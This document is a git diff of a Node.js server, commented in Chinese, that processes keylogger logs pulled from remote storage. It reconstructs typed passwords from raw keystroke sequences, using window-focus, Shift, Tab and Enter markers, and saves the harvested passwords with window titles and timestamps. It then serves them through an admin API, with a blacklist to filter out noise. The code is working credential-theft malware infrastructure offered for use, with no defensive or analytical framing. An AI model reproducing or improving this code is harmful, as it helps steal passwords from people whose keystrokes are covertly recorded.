-            const hash = hashPassword(item.password);
-            return !blacklistedHashes.has(hash);
-        });
-
-        // 去重：按密码内容 + 来源文件组合去重
-        const uniquePasswords = [];
-        const seenSet = new Set();
-        for (const item of filteredPasswords) {
-            const key = `${item.file}|${item.password}`;
-            if (!seenSet.has(key)) {
-                seenSet.add(key);
-                uniquePasswords.push(item);
-            }
-        }
-        
-        // 按时间戳排序（最新的在前）
-        uniquePasswords.sort((a, b) => (b.timestamp || '').localeCompare(a.timestamp || ''));
-
-        // 保存提取结果到本地文件
-        const resultFilename = 'extracted_passwords.txt';
-        const resultContent = uniquePasswords.map((item, index) => {
-            return `${index + 1}. 来自: ${item.file}\n` +
-                   `窗口: ${item.window || '未知'}\n` +
-                   `时间: ${item.timestamp}\n` +
-                   `内容: ${item.password}\n` +
-                   `原始数据: ${item.rawPassword}\n`;
-        }).join('\n');
-
-        const logsDir = path.join(__dirname, 'logs');
-        if (!fs.existsSync(logsDir)) {
-            fs.mkdirSync(logsDir, { recursive: true });
-        }
-        const filePath = path.join(logsDir, resultFilename);
-        await fs.promises.writeFile(filePath, resultContent);
-        logger.info(`成功保存提取结果到: ${filePath}, 密码数量: ${uniquePasswords.length}`);
-
-        // 更新缓存：存储所有文件的当前 mtime 和全部密码结果
-        extractionCache.lastExtractTime = Date.now();
-        extractionCache.passwords = uniquePasswords;
-        // 清空并重新填充 fileMTimes
-        extractionCache.fileMTimes.clear();
-        for (const [filename, state] of currentFileStates.entries()) {
-            extractionCache.fileMTimes.set(filename, state.mtime);
-        }
-
-        res.json({
-            success: true,
-            count: uniquePasswords.length
-        });
-    } catch (error) {
-        logger.error('提取密码失败', { error: error.message, stack: error.stack });
-        res.status(500).json({ error: '提取密码失败' });
-    }
-}));
-
-app.post('/api/blacklist', asyncHandler(async (req, res) => {
-    const { password } = req.body;
-    if (!password || typeof password !== 'string' || !password.trim()) {
-        return res.status(400).json({ error: '密码不能为空' });
-    }
-
-    const normalizedPassword = normalizePassword(password);
-    const passwordHash = hashPassword(normalizedPassword);
-
-    await executeWithRetry(
-        'INSERT IGNORE INTO password_blacklist (password_hash, password) VALUES (?, ?)',
-        [passwordHash, normalizedPassword]
-    );
-
-    res.json({ success: true });
-}));
-
-app.get('/api/blacklist', asyncHandler(async (req, res) => {
-    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
-    const limit = Math.min(100, Math.max(5, parseInt(req.query.limit, 10) || 20));
-    const offset = (page - 1) * limit;
-
-    const totalCountRows = await executeWithRetry('SELECT COUNT(*) AS total FROM password_blacklist', []);
-    const total = Array.isArray(totalCountRows) && totalCountRows[0] ? totalCountRows[0].total : 0;
-    const totalPages = Math.max(1, Math.ceil(total / limit));
-
-    const rows = await executeWithRetry(
-        'SELECT id, password, password_hash, created_at FROM password_blacklist ORDER BY created_at DESC LIMIT ? OFFSET ?',
-        [limit, offset]
-    );
-
-    res.json({ success: true, blacklist: rows, total, page, limit, totalPages });
-}));
-
-app.delete('/api/blacklist/:id', asyncHandler(async (req, res) => {
-    const id = Number(req.params.id);
-    if (!Number.isInteger(id) || id <= 0) {
-        return res.status(400).json({ success: false, error: '非法的黑名单 ID' });
-    }
-
-    const result = await executeWithRetry('DELETE FROM password_blacklist WHERE id = ?', [id]);
-    if (result.affectedRows === 0) {
-        return res.status(404).json({ success: false, error: '黑名单项不存在' });
-    }
-
-    res.json({ success: true });
-}));
-
-app.get('/api/extract-passwords/view', asyncHandler(async (req, res) => {
-    try {
-        const resultFilename = 'extracted_passwords.txt';
-        // 使用绝对路径确保文件路径正确
-        const filePath = path.join(__dirname, 'logs', resultFilename);
-        
-        logger.info(`尝试读取提取结果文件: ${filePath}`);
-        
-        if (!fs.existsSync(filePath)) {
-            logger.warn(`提取结果文件不存在: ${filePath}`);
-            return res.status(404).send('提取结果文件不存在');
-        }
-        
-        const content = fs.readFileSync(filePath, 'utf8');
-        logger.info(`成功读取提取结果文件，大小: ${content.length} 字节`);
-        res.type('text/plain').send(content);
-    } catch (error) {
-        logger.error('查看提取结果失败', { error: error.message, stack: error.stack });
-        res.status(500).send('查看提取结果失败');
-    }
-}));
-
-// 解析包含特殊键的密码字符串
-
-
-// 将原始按键序列解析为可读密码
-function parsePassword(rawSequence) {
-    if (!rawSequence) return '';
-    const lines = rawSequence.split('\n').filter(line => line.trim() !== '');
-    const result = [];
-    let shiftPressed = false;
-    let ctrlPressed = false;
-    let altPressed = false;
-
-    const shiftMap = {
-        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
-        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
-        '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
-        ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
-        '`': '~'
-    };
-
-    for (const line of lines) {
-        // 处理修饰键
-        if (line === '[LSHIFT]' || line === '[RSHIFT]') {
-            shiftPressed = true;
-            continue;
-        }
-        if (line === '[LSHIFT_RELEASE]' || line === '[RSHIFT_RELEASE]') {
-            shiftPressed = false;
-            continue;
-        }
-        if (line === '[LCONTROL]' || line === '[RCONTROL]') {
-            ctrlPressed = true;
-            continue;
-        }
-        if (line === '[LCONTROL_RELEASE]' || line === '[RCONTROL_RELEASE]') {
-            ctrlPressed = false;
-            continue;
-        }
-        if (line === '[LALT]' || line === '[RALT]') {
-            altPressed = true;
-            continue;
-        }
-        if (line === '[LALT_RELEASE]' || line === '[RALT_RELEASE]') {
-            altPressed = false;
-            continue;
-        }
-
-        // 忽略单独的控制键（如 [ENTER]、[TAB] 等，这些在序列收集中已经作为分隔符）
-        if (line.startsWith('[') && line.endsWith(']')) {
-            // 对于退格键，删除最后一个字符
-            if (line === '[BACKSPACE]' || line === '[BACK]') {
-                result.pop();
-            }
-            // 其他控制键忽略（不加入密码）
-            continue;
-        }
-
-        // 处理普通字符
-        let char = line;
-        if (line.length === 1) {
-            if (shiftPressed) {
-                char = shiftMap[line] || line.toUpperCase();
-            } else {
-                char = line.toLowerCase();
-            }
-        }
-        // Ctrl 组合键通常不产生可打印字符，忽略
-        if (ctrlPressed || altPressed) {
-            continue;
-        }
-        result.push(char);
-    }
-    return result.join('');
-}
-
-// 从日志内容中提取密码。分离用户名与密码
-// 从日志内容中提取密码（增强版，支持焦点切换、Tab切换、回车提交）
-// 新增辅助函数：从原始序列解析密码（修复修饰键状态重置问题）
 function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialAlt) {
     let shift = initialShift;
     let ctrl = initialCtrl;
@@ -1872,41 +1452,18 @@ function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialA
     };
 
     for (const item of sequence) {
-        if (item === '[LSHIFT]' || item === '[RSHIFT]') {
-            shift = true;
-            continue;
-        }
-        if (item === '[LSHIFT_RELEASE]' || item === '[RSHIFT_RELEASE]') {
-            shift = false;
-            continue;
-        }
-        if (item === '[LCONTROL]' || item === '[RCONTROL]') {
-            ctrl = true;
-            continue;
-        }
-        if (item === '[LCONTROL_RELEASE]' || item === '[RCONTROL_RELEASE]') {
-            ctrl = false;
-            continue;
-        }
-        if (item === '[LALT]' || item === '[RALT]') {
-            alt = true;
-            continue;
-        }
-        if (item === '[LALT_RELEASE]' || item === '[RALT_RELEASE]') {
-            alt = false;
-            continue;
-        }
-        if (item.startsWith('[') && item.endsWith(']')) continue; // 其他控制键忽略
-        
-        if (ctrl || alt) continue; // Ctrl/Alt 组合不产生可打印字符
+        if (item === '[LSHIFT]' || item === '[RSHIFT]') { shift = true; continue; }
+        if (item === '[LSHIFT_RELEASE]' || item === '[RSHIFT_RELEASE]') { shift = false; continue; }
+        if (item === '[LCONTROL]' || item === '[RCONTROL]') { ctrl = true; continue; }
+        if (item === '[LCONTROL_RELEASE]' || item === '[RCONTROL_RELEASE]') { ctrl = false; continue; }
+        if (item === '[LALT]' || item === '[RALT]') { alt = true; continue; }
+        if (item === '[LALT_RELEASE]' || item === '[RALT_RELEASE]') { alt = false; continue; }
+        if (item.startsWith('[') && item.endsWith(']')) continue;
+        if (ctrl || alt) continue;
         
         let char = item;
         if (item.length === 1) {
-            if (shift) {
-                char = shiftMap[item] || item.toUpperCase();
-            } else {
-                char = item.toLowerCase();
-            }
+            char = shift ? (shiftMap[item] || item.toUpperCase()) : item.toLowerCase();
         }
         result.push(char);
     }
@@ -1940,7 +1497,6 @@ function extractPasswordsFromLog(content, filename) {
             }
             rawSequence = [];
         }
-        // 重置修饰键状态
         shiftPressed = false;
         ctrlPressed = false;
         altPressed = false;
@@ -1949,7 +1505,6 @@ function extractPasswordsFromLog(content, filename) {
     for (let i = 0; i < lines.length; i++) {
         const line = lines[i].trim();
         
-        // 窗口切换行：重置所有状态
         if (line.startsWith('[Window:')) {
             saveCurrentPassword();
             inPasswordField = false;
@@ -1965,42 +1520,19 @@ function extractPasswordsFromLog(content, filename) {
             continue;
         }
         
-        // 处理修饰键按下/释放
-        if (line === '[LSHIFT]' || line === '[RSHIFT]') {
-            shiftPressed = true;
-            continue;
-        }
-        if (line === '[LSHIFT_RELEASE]' || line === '[RSHIFT_RELEASE]') {
-            shiftPressed = false;
-            continue;
-        }
-        if (line === '[LCONTROL]' || line === '[RCONTROL]') {
-            ctrlPressed = true;
-            continue;
-        }
-        if (line === '[LCONTROL_RELEASE]' || line === '[RCONTROL_RELEASE]') {
-            ctrlPressed = false;
-            continue;
-        }
-        if (line === '[LALT]' || line === '[RALT]') {
-            altPressed = true;
-            continue;
-        }
-        if (line === '[LALT_RELEASE]' || line === '[RALT_RELEASE]') {
-            altPressed = false;
-            continue;
-        }
+        if (line === '[LSHIFT]' || line === '[RSHIFT]') { shiftPressed = true; continue; }
+        if (line === '[LSHIFT_RELEASE]' || line === '[RSHIFT_RELEASE]') { shiftPressed = false; continue; }
+        if (line === '[LCONTROL]' || line === '[RCONTROL]') { ctrlPressed = true; continue; }
+        if (line === '[LCONTROL_RELEASE]' || line === '[RCONTROL_RELEASE]') { ctrlPressed = false; continue; }
+        if (line === '[LALT]' || line === '[RALT]') { altPressed = true; continue; }
+        if (line === '[LALT_RELEASE]' || line === '[RALT_RELEASE]') { altPressed = false; continue; }
 
-        // 焦点切换标记（如果存在）
         if (line.startsWith('[Focus:')) {
             const focusLower = line.toLowerCase();
             if (focusLower.includes('password') || focusLower.includes('密码')) {
                 saveCurrentPassword();
                 inPasswordField = true;
                 rawSequence = [];
-            } else if (focusLower.includes('username') || focusLower.includes('用户名')) {
-                saveCurrentPassword();
-                inPasswordField = false;
             } else {
                 saveCurrentPassword();
                 inPasswordField = false;
@@ -2008,43 +1540,196 @@ function extractPasswordsFromLog(content, filename) {
             continue;
         }
 
-        // TAB 键：切换输入框
         if (line.includes('[TAB]')) {
             if (inPasswordField) {
                 saveCurrentPassword();
                 inPasswordField = false;
             } else {
-                // 假设从用户名切换到密码框
                 inPasswordField = true;
                 rawSequence = [];
             }
             continue;
         }
 
-        // ENTER 键：提交表单
         if (line.includes('[ENTER]') || line.includes('[RETURN]')) {
             saveCurrentPassword();
             inPasswordField = false;
             continue;
         }
 
-        // 退格键处理：删除最后一个原始输入
         if (line === '[BACKSPACE]' || line === '[BACK]') {
             if (inPasswordField) rawSequence.pop();
             continue;
         }
 
-        // 如果当前在密码输入框中，收集普通按键（非空行）
         if (inPasswordField && line && !line.startsWith('[')) {
             rawSequence.push(line);
         }
     }
     
-    // 处理文件末尾残留
     saveCurrentPassword();
     return passwords;
 }
-// 统一错误处理中间件
+
+app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
+    const allFiles = await alistClient.listFiles(alistClient.basePath);
+    const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
+    
+    if (logFiles.length === 0) return res.json({ success: true, count: 0 });
+
+    const currentFileStates = new Map();
+    for (const file of logFiles) {
+        const mtime = file.uploadTime ? new Date(file.uploadTime).getTime() : Date.now();
+        currentFileStates.set(file.filename, { mtime });
+    }
+
+    let needFullReextraction = false;
+    if (extractionCache.fileMTimes.size !== currentFileStates.size) {
+        needFullReextraction = true;
+    } else {
+        for (const [filename, state] of currentFileStates.entries()) {
+            const cached = extractionCache.fileMTimes.get(filename);
+            if (!cached || cached !== state.mtime) {
+                needFullReextraction = true;
+                break;
+            }
+        }
+    }
+
+    if (!needFullReextraction && extractionCache.passwords.length > 0) {
+        logger.info('缓存完全有效，直接返回密码提取结果');
+        return res.json({ success: true, count: extractionCache.passwords.length });
+    }
+
+    const filesToProcess = [];
+    for (const file of logFiles) {
+        const mtime = currentFileStates.get(file.filename).mtime;
+        const cachedMtime = extractionCache.fileMTimes.get(file.filename);
+        if (!cachedMtime || cachedMtime !== mtime) filesToProcess.push(file);
+    }
+
+    logger.info(`密码提取：共 ${logFiles.length} 个日志文件，其中 ${filesToProcess.length} 个需要处理`);
+
+    let blacklistedHashes = new Set();
+    try {
+        const blacklistedRows = await executeWithRetry('SELECT password_hash FROM password_blacklist', []);
+        blacklistedRows.forEach(row => blacklistedHashes.add(row.password_hash));
+    } catch (error) {
+        logger.warn('读取密码黑名单失败，继续提取密码', { error: error.message });
+    }
+
+    const extractLimit = pLimit(CONFIG.extractConcurrency);
+    const extractTasks = filesToProcess.map(file => extractLimit(async () => {
+        try {
+            const content = await alistClient.readFile(`${alistClient.basePath}/${file.filename}`);
+            return extractPasswordsFromLog(content, file.filename);
+        } catch (error) {
+            logger.warn(`读取日志文件失败: ${file.filename}`, { error: error.message });
+            return [];
+        }
+    }));
+
+    const results = await Promise.allSettled(extractTasks);
+    const newPasswords = [];
+    results.forEach(result => {
+        if (result.status === 'fulfilled') newPasswords.push(...result.value);
+    });
+
+    const unchangedFileNames = new Set(
+        logFiles.filter(f => !filesToProcess.some(pf => pf.filename === f.filename))
+            .map(f => f.filename)
+    );
+    const cachedPasswordsFromUnchangedFiles = extractionCache.passwords.filter(item =>
+        unchangedFileNames.has(item.file)
+    );
+
+    let allPasswords = [...cachedPasswordsFromUnchangedFiles, ...newPasswords];
+    const filteredPasswords = allPasswords.filter(item => {
+        const hash = hashPassword(item.password);
+        return !blacklistedHashes.has(hash);
+    });
+
+    const uniquePasswords = [];
+    const seenSet = new Set();
+    for (const item of filteredPasswords) {
+        const key = `${item.file}|${item.password}`;
+        if (!seenSet.has(key)) {
+            seenSet.add(key);
+            uniquePasswords.push(item);
+        }
+    }
+    uniquePasswords.sort((a, b) => (b.timestamp || '').localeCompare(a.timestamp || ''));
+
+    const resultFilename = 'extracted_passwords.txt';
+    const resultContent = uniquePasswords.map((item, index) => {
+        return `${index + 1}. 来自: ${item.file}\n` +
+               `窗口: ${item.window || '未知'}\n` +
+               `时间: ${item.timestamp}\n` +
+               `内容: ${item.password}\n` +
+               `原始数据: ${item.rawPassword}\n`;
+    }).join('\n');
+
+    const logsDir = path.join(__dirname, 'logs');
+    if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
+    await fs.promises.writeFile(path.join(logsDir, resultFilename), resultContent);
+    logger.info(`成功保存提取结果到: ${resultFilename}, 密码数量: ${uniquePasswords.length}`);
+
+    extractionCache.lastExtractTime = Date.now();
+    extractionCache.passwords = uniquePasswords;
+    extractionCache.fileMTimes.clear();
+    for (const [filename, state] of currentFileStates.entries()) {
+        extractionCache.fileMTimes.set(filename, state.mtime);
+    }
+
+    res.json({ success: true, count: uniquePasswords.length });
+}));
+
+app.post('/api/blacklist', asyncHandler(async (req, res) => {
+    const { password } = req.body;
+    if (!password || typeof password !== 'string' || !password.trim()) {
+        return res.status(400).json({ error: '密码不能为空' });
+    }
+    const normalizedPassword = normalizePassword(password);
+    const passwordHash = hashPassword(normalizedPassword);
+    await executeWithRetry(
+        'INSERT IGNORE INTO password_blacklist (password_hash, password) VALUES (?, ?)',
+        [passwordHash, normalizedPassword]
+    );
+    res.json({ success: true });
+}));
+
+app.get('/api/blacklist', asyncHandler(async (req, res) => {
+    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
+    const limit = Math.min(100, Math.max(5, parseInt(req.query.limit, 10) || 20));
+    const offset = (page - 1) * limit;
+
+    const totalCountRows = await executeWithRetry('SELECT COUNT(*) AS total FROM password_blacklist', []);
+    const total = Array.isArray(totalCountRows) && totalCountRows[0] ? totalCountRows[0].total : 0;
+    const totalPages = Math.max(1, Math.ceil(total / limit));
+
+    const rows = await executeWithRetry(
+        'SELECT id, password, password_hash, created_at FROM password_blacklist ORDER BY created_at DESC LIMIT ? OFFSET ?',
+        [limit, offset]
+    );
+    res.json({ success: true, blacklist: rows, total, page, limit, totalPages });
+}));
+
+app.delete('/api/blacklist/:id', asyncHandler(async (req, res) => {
+    const id = Number(req.params.id);
+    if (!Number.isInteger(id) || id <= 0) return res.status(400).json({ success: false, error: '非法的黑名单 ID' });
+    const result = await executeWithRetry('DELETE FROM password_blacklist WHERE id = ?', [id]);
+    if (result.affectedRows === 0) return res.status(404).json({ success: false, error: '黑名单项不存在' });
+    res.json({ success: true });
+}));
+
+app.get('/api/extract-passwords/view', asyncHandler(async (req, res) => {
+    const filePath = path.join(__dirname, 'logs', 'extracted_passwords.txt');
+    if (!fs.existsSync(filePath)) return res.status(404).send('提取结果文件不存在');
+    const content = fs.readFileSync(filePath, 'utf8');
+    res.type('text/plain').send(content);
+}));
+
+// ========== 全局错误处理 ==========
 app.use((err, req, res, next) => {
     logger.error('API 错误', { url: req.url, error: err.message, stack: err.stack });
     res.status(err.status || 500).json({
@@ -2053,23 +1738,17 @@ app.use((err, req, res, next) => {
     });
 });
 
-// 关机
+// ========== 优雅关机 ==========
 let shuttingDown = false;
-
 process.on('SIGTERM', shutdown);
 process.on('SIGINT', shutdown);
 
 async function shutdown() {
-    if (shuttingDown) {
-        return;
-    }
+    if (shuttingDown) return;
     shuttingDown = true;
     logger.info('开始关机...');
     clearInterval(clientManager.heartbeatTimer);
-
-    if (clientManager.tcpServer) {
-        clientManager.tcpServer.close();
-    }
+    if (clientManager.tcpServer) clientManager.tcpServer.close();
     wss.clients.forEach(ws => ws.terminate());
     server.close(async () => {
         logger.info('HTTP 服务器已关闭');
@@ -2079,7 +1758,7 @@ async function shutdown() {
     });
 }
 
-// 启动服务
+// ========== 启动服务 ==========
 (async () => {
     try {
         await clientManager.init();
@@ -2090,10 +1769,9 @@ async function shutdown() {
         let port = CONFIG.httpPort;
         
         if (httpsEnabled) {
-            const keyPath = process.env.HTTPS_KEY_PATH
-            const certPath = process.env.HTTPS_CERT_PATH
+            const keyPath = process.env.HTTPS_KEY_PATH;
+            const certPath = process.env.HTTPS_CERT_PATH;
             
-            // 如果证书不存在，尝试生成自签名证书
             if (!fs.existsSync(keyPath) || !fs.existsSync(certPath)) {
                 generateSelfSignedCert();
             }
@@ -2101,24 +1779,20 @@ async function shutdown() {
             if (fs.existsSync(keyPath) && fs.existsSync(certPath)) {
                 const key = fs.readFileSync(keyPath);
                 const cert = fs.readFileSync(certPath);
-                const credentials = { key, cert };
-                serverInstance = https.createServer(credentials, app);
+                serverInstance = https.createServer({ key, cert }, app);
                 protocol = 'https';
                 logger.info('HTTPS 模式已启用');
             } else {
                 logger.warn('HTTPS 证书文件不存在，将使用 HTTP 模式');
-                logger.warn(`请将证书文件放置在 ${keyPath} 和 ${certPath}`);
             }
         }
         
-        // 重新创建 WebSocket 服务器以使用 HTTPS 服务器
         wss = new WebSocket.Server({ server: serverInstance });
         wss.on('connection', handleWebSocketConnection);
         
         serverInstance.listen(port, () => {
             logger.info(`${protocol.toUpperCase()} 服务运行在端口 ${port}`);
-            const url = `${protocol}://localhost:${port}/login.html`;
-            logger.info(`访问 ${url} 打开管理界面`);
+            logger.info(`访问 ${protocol}://localhost:${port}/login.html 打开管理界面`);
         });
     } catch (err) {
         logger.error('服务启动失败', { error: err.message, stack: err.stack });
